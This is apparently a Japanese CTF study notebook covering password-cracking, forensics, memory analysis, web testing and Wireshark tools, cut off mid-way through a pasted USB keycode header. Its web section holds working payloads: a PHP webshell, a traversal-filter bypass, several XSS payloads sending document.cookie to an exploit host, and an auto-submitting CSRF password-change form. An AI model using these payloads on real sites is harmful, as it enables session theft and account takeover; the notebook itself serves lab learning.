 https://www.atmarkit.co.jp/ait/articles/1809/14/news041.html 

### lhaplus

解凍圧縮ツール

### Zydra

Linuxで使えるパスワードクラックツール
 RARファイル、ZIPファイル、PDFファイル、Linuxシャドウファイルが対象
 https://null-byte.wonderhowto.com/how-to/crack-password-protected-zip-files-pdfs-more-with-zydra-0207607/  

wget https://raw.githubusercontent.com/hamedA2/Zydra/master/Zydra.py
pip3 install rarfile pyfiglet py-term
python3 ./Zydra.py -f ダウンロード/flag.zip -b letters -m 1 -x 4

### fcrackzip
zipファイルに対するパスワード総当たりツール
```
fcrackzip -u ダウンロード/flag2.zip -l 1-6 -c 1aA 
```

### 7zip
解凍ソフト。
ovaファイルも解凍できる。解凍するとovfとvmdkになる。vmdkも解凍できるらしいダブルクリックだと失敗したが右クリックからのExtract Filesだと成功した。
vmdkと同じ方法でimgファイルも展開できた。

## docker

### run
dockerのイメージを動かいたいとき。ローカルにイメージがなければdockerhubからダウンロードして実行する

#### run -it [イメージ名] /bin/sh
指定したイメージを対話モードで起動する。

#### run -v [ホスト側ディレクトリ]:[イメージ側ディレクトリ]
指定したディレクトリを共有させる
イメージの中でこれをやられてもホスト側の共有につながる

### pull
dockerのイメージをダウンロードしたいときに。

### inspect
dockerの構成情報を表示する
cmdの項目には起動された際に何をするかが書かれている




# フォレンジック

### チェックリスト

``` 
通常、主催者は、メモリダンプのようなデジタル画像や画像ファイルのようなものなどを提供してくれます。.raw.e01最初に取得したファイルには常にコマンドを発行してください。fileコマンドの結果が「」のみの場合は、ファイルに含まれる情報を切り分けるための適切なツールを見つけるために、さらに努力する必要があります。file <filename>dataコマンドを使用して、ファイルのEXIFデータをチェックアウトします。exiftool <filename>手がかりを求めて実行します。strings  コマンドを使用してファイルカービングを試してください。何よりもまず、すべてのファイルをサポートします。ただし、大きなサイズのファイルに直面すると、すべてのファイルを抽出するのに時間がかかります。foremost <filename>さまざまなアーティファクトの一般的な場所：-：閲覧履歴、Cookie、キャッシュファイルなど。Windows OS：レジストリテーブル、イベントログなど。Linux：構成ファイル、ログファイルなど。携帯電話：アプリデータなど。もっとたくさん！。ツール：-ボラティリティ。そのメモリフォレンジックのためのメモリ抽出ユーティリティフレームワーク。これをボラティリティコマンドリファレンスとして使用します。レッドライン。ボラティリティのもう1つの代替手段。しかし、ボラティリティは私にとって最高です。バルクエクストラクターソフトウェア。電子メールアドレス、クレジットカード番号、URL、その他の種類の情報などの機能をデジタル証拠ファイルから抽出できます。FTKイメージャ。FTK Imagerは、ローカルハードドライブ、ネットワークドライブ、CD / DVD上のファイルとフォルダーを調べ、フォレンジックイメージまたはメモリダンプの内容を確認できるデータプレビューおよびイメージングツールです。Autopsy、ProDiscover、またはEnCaseソフトウェアを使用して、FTKImagerとして機能します。破損したファイルシステムを修正するために使用します。ext3および4。e2fsck [mnt image]Recuvaを使用してファイルを回復します。FTKImagerを使用してマシンにマウントできるイメージが提供される場合があります。だから、ドライブに移動し、必要なファイルを回復してみてください。レジストリ分析用のRegRipperWindowsイベントビューアをマスターすると、プラスになります。などなど！
```



### エリックジマーマン作ツール群

https://ericzimmerman.github.io/#!index.md

#### PECmd（Prefetchファイルの解析ツール）

https://tsalvia.hatenablog.com/entry/2019/02/25/005319

####  Registry Explorer (レジストリの 特定のキー・バリューを調査 )

#### ShellBags Explorer(削除されたファイルやアクセスされたファイルの確認)

ShellBags とは、アイコンの大きさといったレイアウト情報を格納する、Explorer が使用するレジストリキー。
 以前アクセスしたフォルダーを確認する方法を紹介します。 
https://troushoo.blog.fc2.com/blog-entry-439.html?sp

####  Evtx Explorer / EvtxECmd ( イベントログ )

### タイムライン
拡張子.dbのファイルはWindowsのTimeline機能で作られたファイル。
SQLiteで作られているのでDB Browser for SQLiteで読みことができる。
ActivityテーブルのPayloadカラムにどんなアプリケーションを使用したのかがでる
https://port139.hatenablog.com/entry/2018/05/19/070956

### イベントログ
SecurityログのイベントIDの 4624 (ログオンの成功), 4625 (ログオンの失敗), 4672 (特権の使用) 4648（明示的な資格情報を使用してログオンを試みました）とか重要なイベントでフィルタをかけていくしかない？
ネットワーク経由のログインの場合はLogonType=3


### python-evtx
Windows Eventlogをxml形式に変換するpython
これがあればlinuxでも解析が可能なのとgrepとかでの絞り込みができる
https://github.com/williballenthin/python-evtx
```
$ git clone https://github.com/williballenthin/python-evtx.git
$ python python-evtx/scripts/evtx_dump.py Security.evtx > data.xml
```

### FullEventLogView
https://www.nirsoft.net/utils/full_event_log_view.html

### regripper

https://code.google.com/archive/p/regripper/downloads
※本体「rrv2.8.zip」およびプラグイン「plugins20130429.zip」
2つのファイルを解凍後、プラグインを「plugins」というフォルダに変更して
rip.exeと同じフォルダに配置します。
.\rip.exe -p userassist -r ..\EVIDENCE

### kanireg
GUIで動かせるregripper
NTUSERでプログラムの実行の回数や日時がわかる
2017/11/30 14:14:24 +9:00　C:\Users\test\Desktop\fuga_p2p.exe (1)←日時　プログラム名　（起動回数）
また、自動起動設定もここに入っている

SAMならユーザのログイン日時がわかる

System32¥configに入っている

### APIMonitor
プログラムが実行しているAPIをチェックする
管理者権限で起動してAPIFilterで確認するAPIだけに絞るとよい。
プロセス系
「EnumProcesses」・・PCで実行されいてるプロセス一覧の取得
「OpenProcess」・・プロセスにアタッチ
「GetModuleFileNameEx」・・プロセス名取得
「GetModuleFileName」・・プロセス名取得

File->Monitor New Processesでexeを指定してOKを押すとexeが実行されて呼ばれたAPIが表示される。

https://ncss-ctf.mydns.jp/themes/core_jp/static/img/API%20Monitor%20(rohitab.com)_9d775338f4e05dbaaec42ae8467092e1.zip

### 代替えデータストリーム（RAR）
ファイルに文字列を隠す方法。
```
#存在の確認
dir /r
#読む
more < ストリーム
```

### Sysmon
イベントログに操作のログが表示されるようになる
「アプリケーションとサービスログ」-「Microsoft」-「Windows」-「Sysmon」-「Operational」

```
#起動
sysmon -i
#アンインストール
sysmon -u
```
 Sysmon
 https://docs.microsoft.com/ja-jp/sysinternals/downloads/sysmon

### mongoDBのリストア
```bash=
#ダンプしたmongoDBのファイルはmongorestoreで直せる
mongorestore -d [DB名] [ダンプファイルのディレクトリ]
#接続
mongo osint
#DB一覧
show dbs
#DB内のコレクション表示
show collections
#全件表示、コレクション名を指定する
db.twitter_timeline.find()
#検索、フィールド：値で検索する以下で削除されたもの
db.twitter_timeline.find({'status':'delete'})

```

### WinPrefetchView
プリフェッチディレクトリの解析ツール
最終実行時刻やプログラムの実行回数、パス、関連ファイルなどがわかる
デフォルトでは起動したマシンのプリフェッチを読み取るので以下の設定が必要
Options->Advanced Options->Prefetch Folder　でPrefetchフォルダを指定



# ディスクフォレンジック

### Autopsy

参考URL
 https://www.itseclab.jp/security_info/digital_forensic/digital_forensic_implementation/autopsy_varification/ 

### FTK imager
ディスクイメージを解析するソフト
File->Add Evidence Item->Image Fileで読み込ませるファイルを選択

参考URL
 http://sectanlab.sakura.ne.jp/report/Manual_FTKimager.pdf 

システムの情報が見たい場合はSYSTEMレジストリハイブを抽出する。
Basic data partition以下の NONAME[NTFS]\root]\Windows\System32\config\SYSTEM　がSYSTEMレジストリハイブ
このハイブをレジストリを解析するAccessData Registry ViewerとかRegRipperにかける

ユーザの情報が見たい場合はNTUSER.DATレジストリハイブを抽出する。
Basic data partition以下の NONAME[NTFS]\root]\Users\以下に各ユーザのディレクトリがあり、その下がNTUSER.DATレジストリハイブ

ファイル一覧の出力
FTK Imager上でドライブ選択→右クリック→Export Directry Listingとするとそのドライブ以下のファイル一覧を作ることができます。

プリフェッチは%SystemRoot%\Prefetch\*.pfにある

### Mailデータの復元
Thunderbirdはデフォルトインストールの場合、データファイルを以下に格納します。
C:\Users\ユーザ名\AppData\Roaming\Thunderbird\Profiles\soglqdtd.default-release
この中のINBOXデータを見るとよい
見るためのツール
http://www.mitec.cz/mailview.html
https://www.systoolsgroup.com/mbox-viewer.html




### foremost 

ファイル抽出
 https://orebibou.com/ja/home/201704/20170412_002/ 

### binwalk

 ファームウェアイメージの分析、リバースエンジニアリング、および抽出を行うための高速で使いやすいツール 
```
binwalk -D='.*' deletedfile.raw
```
https://qiita.com/hana_shin/items/a730b1b60eadd1ab3b36 

### 

### うさみみハリケーン

ファイル・データ抽出機能が便利。
内包ファイル・データ探索で探して、結果を選択して抽出する
参考URL
https://digitaltravesia.jp/usamimihurricane/webhelp/_RESOURCE/MenuItem/another/anotherAboutSteganography.html 

### ファイル名の変更履歴

USNJournalに残っている可能性が
 https://www.jpcert.or.jp/present/2018/JSAC2018_03_yamazaki.pdf

### FTE

$MFTファイルの解析に、CSV形式にして出力できる
http://www.kazamiya.net/fte

MFT（マスターファイルテーブル）ファイルにはファイルのタイムスタンプの情報が記載されている。
STDINFOとFILENAMEの２種類があるが、STDINFOはエクスプローラから見えるほうで変更が容易、FILENAMEは信頼度が高い

### MFT2CVS

こっちも＄MFTファイルの解析ソフト。こっちの方が動作が軽いかも
これでCSVにするとファイルサイズなんかも見れるよう
https://github.com/jschicht/Mft2Csv

### Testdisk
ディスクイメージのパーティション情報が壊れている際に修復する
https://jisaku-pc.net/hddhukyuu/archives/6731
```
# mount out.img /mnt/test/
# df -h | grep mnt
/dev/loop0      100M  1.3M   99M   2% /mnt/test
# testdisk /dev/loop0
```

# メモリフォレンジック

### kanivola

メモリフォレンジックツール
参考URL
 http://www.kazamiya.net/KaniVola 
 https://qiita.com/obana2010/items/4fe3113bb46d27e12240 

#### windows
最初にイメージスキャンのImageInfoでプロファイルを特定
次にプロセスのpstreeで動作していたプロセスを確認
プロセスのconsolesを使うとコマンドで実行した履歴や結果が取れる
プロセスメモリのmemdumpを使うとファイルを抽出できる。-Dで出力先を指定して、-pでプロセスを指定する。mspaintからデータを出した場合はgimpで見ることができる。
参考URL　https://www.rootusers.com/google-ctf-2016-forensic-for1-write-up/
その他のcmdlineでプログラムの実行時にどういうコマンドで実行されたかが見える。プログラムにファイルを渡していたらここでそれが見えるかもしれない。
カーネルメモリのfilescanでファイルのメモリ上の位置を特定できる。
カーネルメモリのdumpfilesで特定したファイルを復元できる。
hashdumpでパスワードハッシュを取得できる
userassistでレジストリのUserAssistキーを出力できる。これがあればプログラムの最終起動時刻がわかる。

#### linuxの場合
新しくprofileが必要。OSとカーネルの両方のバージョンを合わせる。

``` bash
sudo apt-get update
#必要なパッケージのインストール
sudo apt-get upgrade
sudo apt-get install build-essential
sudo apt-get install linux-headers-`uname -r`
sudo apt-get install git python dwarfdump zip python-distorm3 python-crypto
#カーネルのバージョン修正
sudo apt-get install linux-headers-4.13.0-16-generic
sudo apt-get install linux-image-4.13.0-16-generic
reboot
#Volatilityをインストールし、Profileを作成します
git clone https://github.com/volatilityfoundation/volatility
cd volatility/tools/linux/
make clean
make
#追加されているか確認
python vol.py --info | grep linux
#後の処理をvolatilityでやるなら
python vol.py --profile=[作成したprofile] -f [ダンプファイル] [プラグイン]
```


プロセスメモリのlinux_bashで実行したコマンドが見れる
カーネルメモリ/オブジェクトのlinux_find_fileで[-F ファイルパス]をつけてファイルのメモリの位置を表示させることができる。[-i メモリの位置 -O 出力先]でファイルを取り出せる
linux_enumerate_filesでメモリ上にある全ファイルの位置を出力できる

ファイルの出力とかを考えると、kanivolaを使わずにlinuxでvolatirityを使ったほうが確実。
windowsだと出力したファイルを動かせなかった。

volatilityのLinuxプラグイン
https://code.google.com/archive/p/volatility/wikis/LinuxCommandReference23.wiki

SANS Volatility memory forensics cheat sheet
https://www.sans.org/posters/memory-forensics-cheat-sheet/

### winpmem
aff4ファイル（Windowsのメモリイメージ）をVolatilityで解析できる形式にするソフト。いかに同梱
[cdir collecotor]
https://www.cyberdefense.jp/products/cdir.html
```
ainpmem.exe ファイル.aff4 --export PhysicalMemory -o ファイル.img
```

# イベントログ

### EvtxExplorer

 evtxファイルをcsvに変換するツール、インストール不要

コマンド例EvtxECmd.exe -d "読み取るファイルパス※" --csv “書き出し先ファイルパス” --csvf “ファイル名.csv”

※読み取るファイルは、ディレクトリ(-d)またはファイル(-f)を指定できる。　ディレクトリを指定した場合、ディレクトリ配下内のevtxファイルは、ひとつのcsvにまとめられる。

使用例：
①　EvtxEcmd.exeが入っているディレクトリでShiftキーを押しながら右クリックしてコマンドウィンドウをここで開く
②　EvtxECmd.exe -d "読み取るファイルパス※" --csv “書き出し先ファイルパス” --csvf “ファイル名.csv” 
③　書き出されたcsvをexcel等で読み取り調査できる。 

# Web系

### robots.txt
検索等のクローラよけの設定ファイル
ここにヒントが書かれている場合がある。
公開されているファイルという事で、見るだろうとされている可能性が高い。

### humans.txt
人間向けにサイトの説明などを載せるファイル

### 動画系
動画を流しているサイトの場合ソースを見て流されているファイルをダウンロードしてみる。
.m3u8ファイルがダウンロードできた場合、それはプレイリストのようなものなのでさらにそこに書かれているファイルをDLして調査する

### URL欄

phpとかでステータスをフォームに入れるとURL欄に値が入る。フォームではなくここから目的の値を入れることがある。

### BurpSuite

ローカルプロキシツール
ProxyタブのInterceptタブの中にあるOpenBrowserでブラウザを開くと他のWebページと調査対象が干渉しなくて便利
参考URL
 https://persol-tech-s.co.jp/corporate/security/article.html?id=10 

historyから書き換えたい通信のところで右クリックして「send to Reperter」を選択するとReperterタブの色が変わるのでそこに切り替えて使うと使いやすい。タブを増やせるので、2回開いて正常なものと見比べるといい
編集したいところをドラッグすると右側のINSPECTORの欄にSELECTED　TEXTというのがでるのでそこで編集ができる

特定のパラメータに対して様々なパラメータを投げたければ
パスワード入力画面を攻略するならイントルーダがいいIntruderを使う。historyから書き換えたい通信のところで右クリックして「send to Intruder」を選択するとIntruderタブの色が変わるのでそこに切り替えて使うと使いやすい。
Payloadのところに入れるパラメータのリストを設定。
Positionsのところにどのパラメータに入れるかを設定してStart attackボタンを押す

### OWASP ZAP

ローカルプロキシ兼Web脆弱性診断ツール
参考URL
 https://qiita.com/crash-boy/items/cb35eadaa4cf4d2cef3f 
 https://qiita.com/tamura__246/items/9c70ddc1c03cf623cf8d 

### nikto

Webサイトの脆弱性診断ツール

参考URL
https://qiita.com/k__murayama/items/2761c8d63a7b8188804f 
https://qiita.com/ken_ichiafs/items/35c304fb9d471074a379 

### wapiti

webサイトの脆弱性診断ツール

参考URL
https://blog.asial.co.jp/410

### wpscan
wordpressの脆弱性スキャンツール

```
wpscan --url http://10.10.11.125 --proxy http://127.0.0.1:8080 --plugins-detection aggressive -e p,u
#apt-tokenを設定するとエラーになってしまうことがある
```

### ffuf
Webアプリケーション ファザー
指定したURLに対してワードリスt内の文字列を使用してアクセスしてその結果を取得する。

-w　使用するワードリスト
-x　プロキシ
-u　アクセス先（FUZZとした所にワードリストの中身が入る）
-request-proto　使うプロトコル。デフォルトがhttpsなのでhttpを使う時は指定する
-c 色を付ける
-v 詳細表示する
-fw 結果にフィルタをかける。fwの場合はResponse wordsを指定している
-request リクエストをファイルから読み込む
Tips
https://github.com/tamimhasan404/FFUF-Tips-And-Tricks

```
#サブドメイン列挙
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -x http://127.0.0.1:8080 -u http://FUZZ.thetoppers.htb -request-proto http -c -v -fw 133,134
#サブドメイン列挙
ffuf -w t.txt -x http://127.0.0.1:8080 -u http://FUZZ.shoppy.htb -request-proto http -c -v 
#ベーシック認証突破後のディレクトリ探索
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:8080 -u 'http://pH0t0:b0Mb!@photobomb.htb/printer/FUZZ' -request-proto http -c -v -fw 133
```

### FireFox

ブラウザ

### Google Chrome

ブラウザ

### PHPの比較の際のデータ型の自動キャスト

PHPでは比較に==を使用するとデータ型を自動判別してキャストする。
またその際に「0e」から始まって数字が続く文字列を与えると0の累乗として扱う。
参考URL
 https://qiita.com/atsushi586/items/adca2368d9a760ad862d 
 http://peccu.hatenablog.com/entry/2015/05/23/000000 

### webページをクローリング

wgetでできる。
例）URL内のディレクトリに1秒ごとDLする。掘る深さは無限で開始したディレクトリの親ディレクトリは探索しない。
wget -r -l inf -w 1 -np https://exsample.com/
これでDLしたものをtreeコマンドで確認すると内部が見れる。

###  DirBuster 

文字リストを使用するWEBクローラー
 https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-directories-websites-using-dirbuster-0157593/ 

###  Gobuster 

文字リストを使用するWEBクローラー高速だが再帰的には探索できないため初回であたりを付ける時に使う？
 https://null-byte.wonderhowto.com/how-to/scan-websites-for-interesting-directories-files-with-gobuster-0197226/ 
 
 オプション
-z 現在の進行度を表示しない
-q バナーを表示させない
-n 見つけたページのステータスコードを出力しない
-e URLを完全な形で出力する
-d 引数として与えた文字列のステータスコードは無視する
-t 同時に実行するスレッド数

``` bash
gobuster dir -u 10.10.11.148 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --proxy "http://127.0.0.1:8080"
#特定のステータスコードは-dオプションで無視する設定にもできる
gobuster dir -u 10.10.11.148 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -b "200,404" --proxy "http://127.0.0.1:8080" 

```

### 送信ファイルサイズの制限
サーバ側で送るファイルサイズが制限されていてコンテンツがすべて取得できない場合。
httpリクエストにrangeというどこからどこまでのデータを取るか指定するパラメータがあるので、
Burpでインターセプトしてそこの値を書き換えて続きを取って結合するとよい

### ホモグラフ
人間の目には同じに見えるが機械的には違う文字を利用した攻撃。フィッシングなどに使用する。
以下のpythonコードで文字列を作成できる。
get_combinationsの引数の文字を一覧で出してくれるが、総当たりでリストを作成するので長い文字列は時間がかかる。一文字づつの方がやりやすそう
機械を相手にする場合は扱えるフォントに注意が必要。
``` python
import homoglyphs as hg
li = hg.Homoglyphs(categories=('LATIN', 'COMMON', 'CYRILLIC')).get_combinations("w")
```

homoglyphs attack generatorでググってもいっぱい出てくる

機械相手にやる場合はおそらくOCRという画像認識のライブラリで形が似ているかを識別している

### WebShell

#### PHP

``` PHP
<pre><?php system($_GET["cmd"]);?></pre>
```

webshellをアップロードして攻撃するタイプの問題が出たとき、アップロードしたwebshellのphpが動かなかった。
.htaccessファイルを空のファイルで上書きしてphpを実行できるようにしてからwebshellを動かしたら動いた


### ディレクトリトラバーサル

```php
str_replace('../', '', $lang);
```

とかでディレクトリトラバーサルに使用される文字列を置換している場合、
置換している回数が一回なら
....//....//のような文字列を打ち込むと置換されずに通る。（真ん中の../が置換されて正しい形になるため）
https://kira924age.hatenadiary.com/entry/2018/12/30/160426

### XSS

被害者に踏ませたscriptの結果を受信する為に使えるサイト

https://pipedream.com/

### Ref XSS

``` 
POST http://153.120.138.163:50004/demand HTTP/1.1Host: 153.120.138.163:50004Content-Length: 193Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://153.120.138.163:50004Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://153.120.138.163:50004/commentAccept-Encoding: gzip, deflateAccept-Language: ja,en-US;q=0.9,en;q=0.8Connection: closename=admin<script%20src="/static/js/jquery-3.3.1.min.js"></script>%0A<script>$.post("http://153.120.138.163:50004/comment",{"name":"aho","comment":document.cookie})</script>&demand=warehatensai
```

### Ref XSS
<>記号をエスケープするように作られていたサイトだったが入力値がimgタグに入るようにされていたのでimgタグの中にonerrorを差し込んでリンクに飛ぶようにした
http://m1-target.mod9.axof.intra.hckr.jp/reflected/?img=a%22+onerror=%22fetch(%27http%3A//m1-exploit.mod9.axof.intra.hckr.jp/%3F%27%2Bdocument.cookie)%3B

### Stored XSS
commentパラメータでPOSTした値が変数に入る仕組みだったので適当な値を入れたのちに閉じてこちらのサイトに飛ばせる処理を入れた。残った余計な文字列はコメントアウトしたのと新しい変数を作ってやってエラーを出なくした

comment="},{"name":"kob","comment":"test"},
]
fetch%28%22http%3A//m1-exploit.mod9.axof.intra.hckr.jp/%3F%22%2Bdocument.cookie%29;
var test = [
//

### DOM XSS
URLからid=以降の文字列を取得してページ内に展開するような処理だったのでid=以降にリンク先へ飛ばす処理を入れた。
被害端末からのアクセスがcurlで行われているらしく、スペースがあるとエラーになったのでスペースの部分を%20に置き換えた

http://m1-target.mod9.axof.intra.hckr.jp/dom-based/?id=<img%20src="none"%20onerror='window.location.href=("http://m1-exploit.mod9.axof.intra.hckr.jp/?"+document.cookie)'>

### CSRF
アクセスして来た人のパスワードを変更する。
パスワード変更ページのリクエストをアクセスしてきた人のセッションIDを利用して送信する。送信内容の中にパスワードの値を入れておくのでその値に変更される

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://m3-target.mod9.axof.intra.hckr.jp/changePassword.php" method="POST">
      <input type="password" name="pass" id="pass" value="12345" />
      <input type="submit" value="変更" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

### AQUATONE
ドメイン名の偵察を実行するためのツールのセット
https://github.com/michenriksen/aquatone


# ネットワーク

### Wireshark

SSL通信の解読
参考URL
https://milestone-of-se.nesuke.com/nw-basic/tls/decrypt-tls-at-executing-packetcapture/

RSAで暗号化された通信の解読
鍵に使われているBase64の文字列はそのまま使用する

それぞれのIPがどんな感じに通信しているかを図で
統計->フローグラフ

そのPcapファイル内で使われているプロトコルをグラフに
統計->プロトコル階層

各IPからどのポートに何回通信したかの一覧を表示
統計->IPv4 Statistics->Destination and port

httpとかでのやりとりの場合にAccept-Encoding: gzip, deflateが見えたなら文字列は見えなくてもファイルをやり取りしている可能性がある。TCPストリームでRaw（無加工）形式にしてそのデータをCyberchefでFromHex＞ExtractFileするとファイルが取り出せるかもしれない


USBとの接続記録を抜き出したい場合

```　
 .\tshark.exe -r C:\Users\CTFUser\Downloads\usb13.pcap -Y 'usbhid.data.key.array' -T fields -e usbhid.data.key.array > C:\Users\CTFUser\Downloads\test2.txt
```

これで必要な行を抜き出せるので、サクラエディタで矩形選択を使用して切り出して、置換してやる。

```
** * USB HID Keyboard scan codes as per USB spec 1.11 * plus some additional codes *  * Created by MightyPork, 2016 * Public domain *  * Adapted from: * https://source.android.com/devices/input/keyboard-devices.html */#ifndef USB_HID_KEYS#define USB_HID_KEYS/** * Modifier masks - used for the first byte in the HID report. * NOTE: The second byte in the report is reserved, 0x00 */#define KEY_MOD_LCTRL  0x01#define KEY_MOD_LSHIFT 0x02#define KEY_MOD_LALT   0x04#define KEY_MOD_LMETA  0x08#define KEY_MOD_RCTRL  0x10#define KEY_MOD_RSHIFT 0x20#define KEY_MOD_RALT   0x40#define KEY_MOD_RMETA  0x80/** * Scan codes - last N slots in the HID report (usually 6). * 0x00 if no key pressed. *  * If more than N keys are pressed, the HID reports  * KEY_ERR_OVF in all slots to indicate this condition. */#define KEY_NONE 0x00 // No key pressed#define KEY_ERR_OVF 0x01 //  Keyboard Error Roll Over - used for all slots if too many keys are pressed ("Phantom key")// 0x02 //  Keyboard POST Fail// 0x03 //  Keyboard Error Undefined#define KEY_A 0x04 // Keyboard a and A#define KEY_B 0x05 // Keyboard b and B#define KEY_C 0x06 // Keyboard c and C#define KEY_D 0x07 // Keyboard d and D#define KEY_E 0x08 // Keyboard e and E#define KEY_F 0x09 // Keyboard f and F#define KEY_G 0x0a // Keyboard g and G#define KEY_H 0x0b // Keyboard h and H#define KEY_I 0x0c // Keyboard i and I#define KEY_J 0x0d // Keyboard j and J#define KEY_K 0x0e // Keyboard k and K#define KEY_L 0x0f // Keyboard l and L#define KEY_M 0x10 // Keyboard m and M#define KEY_N 0x11 // Keyboard n and N#define KEY_O 0x12 // Keyboard o and O#define KEY_P 0x13 // Keyboard p and P#define KEY_Q 0x14 // Keyboard q and Q#define KEY_R 0x15 // Keyboard r and R#define KEY_S 0x16 // Keyboard s and S#define KEY_T 0x17 // Keyboard t and T#define KEY_U 0x18 // Keyboard u and U#define KEY_V 0x19 // Keyboard v and V#define KEY_W 0x1a // Keyboard w and W#define KEY_X 0x1b // Keyboard x and X#define KEY_Y 0x1c // Keyboard y and Y#define KEY_Z 0x1d // Keyboard z and Z#define KEY_1 0x1e // Keyboard 1 and !#define KEY_2 0x1f // Keyboard 2 and @#define KEY_3 0x20 // Keyboard 3 and ##define KEY_4 0x21 // Keyboard 4 and $#define KEY_5 0x22 // Keyboard 5 and %#define KEY_6 0x23 // Keyboard 6 and ^#define KEY_7 0x24 // Keyboard 7 and &#define KEY_8 0x25 // Keyboard 8 and *#define KEY_9 0x26 // Keyboard 9 and (#define KEY_0 0x27 // Keyboard 0 and )#define KEY_ENTER 0x28 // Keyboard Return (ENTER)#define KEY_ESC 0x29 // Keyboard ESCAPE#define KEY_BACKSPACE 0x2a // Keyboard DELETE (Backspace)#define KEY_TAB 0x2b // Keyboard Tab#define KEY_SPACE 0x2c // Keyboard Spacebar#define KEY_MINUS 0x2d // Keyboard - and _#define KEY_EQUAL 0x2e // Keyboard = and +#define KEY_LEFTBRACE 0x2f // Keyboard [ and {#define KEY_RIGHTBRACE 0x30 // Keyboard ] and }#define KEY_BACKSLASH 0x31 // Keyboard \ and |#define KEY_HASHTILDE 0x32 // Keyboard Non-US # and ~#define KEY_SEMICOLON 0x33 // Keyboard ; and :#define KEY_APOSTROPHE 0x34 // Keyboard ' and "#define KEY_GRAVE 0x35 // Keyboard ` and ~#define KEY_COMMA 0x36 // Keyboard , and <#define KEY_DOT 0x37 // Keyboard . and >#define KEY_SLASH 0x38 // Keyboard / and ?#define KEY_CAPSLOCK 0x39 // Keyboard Caps Lock#define KEY_F1 0x3a // Keyboard F1#define KEY_F2 0x3b // Keyboard F2#define KEY_F3 0x3c // Keyboard F3#define KEY_F4 0x3d // Keyboard F4#define KEY_F5 0x3e // Keyboard F5#define KEY_F6 0x3f // Keyboard F6#define KEY_F7 0x40 // Keyboard F7#define KEY_F8 0x41 // Keyboard F8#define KEY_F9 0x42 // Keyboard F9#define KEY_F10 0x43 // Keyboard F10#define KEY_F11 0x44 // Keyboard F11#define KEY_F12 0x45 // Keyboard F12#define KEY_SYSRQ 0x46 // Keyboard Print Screen#define KEY_SCROLLLOCK 0x47 // Keyboard Scroll Lock#define KEY_PAUSE 0x48 // Keyboard Pause#define KEY_INSERT 0x49 // Keyboard Insert#define KEY_HOME 0x4a // Keyboard Home#define KEY_PAGEUP 0x4b // Keyboard Page Up#define KEY_DELETE 0x4c // Keyboard Delete Forward#define KEY_END 0x4d // Keyboard End#define KEY_PAGEDOWN 0x4e // Keyboard Page Down#define KEY_RIGHT 0x4f // Keyboard Right Arrow#define KEY_LEFT 0x50 // Keyboard Left Arrow#define KEY_DOWN 0x51 // Keyboard Down Arrow#define KEY_UP 0x52 // Keyboard Up Arrow#define KEY_NUMLOCK 0x53 // Keyboard Num Lock and Clear#define KEY_KPSLASH 0x54 // Keypad /#define KEY_KPASTERISK 0x55 // Keypad *#define KEY_KPMINUS 0x56 // Keypad -#define KEY_KPPLUS 0x57 // Keypad +#define KEY_KPENTER 0x58 // Keypad ENTER#define KEY_KP1 0x59 // Keypad 1 and End#define KEY_KP2 0x5a // Keypad 2 and Down Arrow#define KEY_KP3 0x5b // Keypad 3 and PageDn#define KEY_KP4 0x5c // Keypad 4 and Left Arrow#define KEY_KP5 0x5d // Keypad 5#define KEY_KP6 0x5e // Keypad 6 and Right Arrow#define KEY_KP7 0x5f // Keypad 7 and Home#define KEY_KP8 0x60 // Keypad 8 and Up Arrow#define KEY_KP9 0x61 // Keypad 9 and Page Up#define KEY_KP0 0x62 // Keypad 0 and Insert#define KEY_KPDOT 0x63 // Keypad . and Delete#define KEY_102ND 0x64 // Keyboard Non-US \ and |#define KEY_COMPOSE 0x65 // Keyboard Application#define KEY_POWER 0x66 // Keyboard Power#define KEY_KPEQUAL 0x67 // Keypad =#define KEY_F13 0x68 // Keyboard F13#define KEY_F14 0x69 // Keyboard F14#define KEY_F15 0x6a // Keyboard F15#define KEY_F16 0x6b // Keyboard F16#define KEY_F17 0x6c // Keyboard F17#define KEY_F18 0x6d // Keyboard F18#define KEY_F19 0x6e // Keyboard F19#define KEY_F20 0x6f // Keyboard F20#define KEY_F21 0x70 // Keyboard F21#define KEY_F22 0x71 // Keyboard F22#define KEY_F23 0x72 // Keyboard F23#define KEY_F24 0x73 // Keyboard F24#define KEY_OPEN 0x74 // Keyboard Execute#define KEY_HELP 0x75 // Keyboard Help#define KEY_PROPS 0x76 // Keyboard Menu#define KEY_FRONT 0x77 // Keyboard Select#define KEY_STOP 0x78 // Keyboard Stop#define KEY_AGAIN 0x79 // Keyboard Again#define KEY_UNDO 0x7a // Keyboard Undo#define KEY_CUT 0x7b // Keyboard Cut#define KEY_COPY 0x7c // Keyboard Copy#define KEY_PASTE 0x7d // Keyboard Paste#define KEY_FIND 0x7e // Keyboard Find#define KEY_MUTE 0x7f // Keyboard Mute#define KEY_VOLUMEUP 0x80 // Keyboard Volume Up#define KEY_VOLUMEDOWN 0x81 // Keyboard Volume Down// 0x82  Keyboard Locking Caps Lock// 0x83  Keyboard Locking Num Lock// 0x84  Keyboard Locking Scroll Lock#define KEY_KPCOMMA 0x85 // Keypad Comma// 0x86  Keypad Equal Sign#define KEY_RO 0x87 // Keyboard International1#define KEY_KATAKANAHIRAGANA 0x88 // Keyboard International2#define KEY_YEN 0x89 // Keyboard International3#define KEY_HENKAN 0x8a // Keyboard International4#define KEY_MUHENKAN 0x8b // Keyboard International5#define KEY_KPJPCOMMA 0x8c // Keyboard International6// 0x8d  Keyboard International7// 0x8e  Keyboard International8// 0x8f  Keyboard International9#define KEY_HANGEUL 0x90 // Keyboard LANG1#define KEY_HANJA 0x91 // Keyboard LANG2#define KEY_KATAKANA 0x92 // 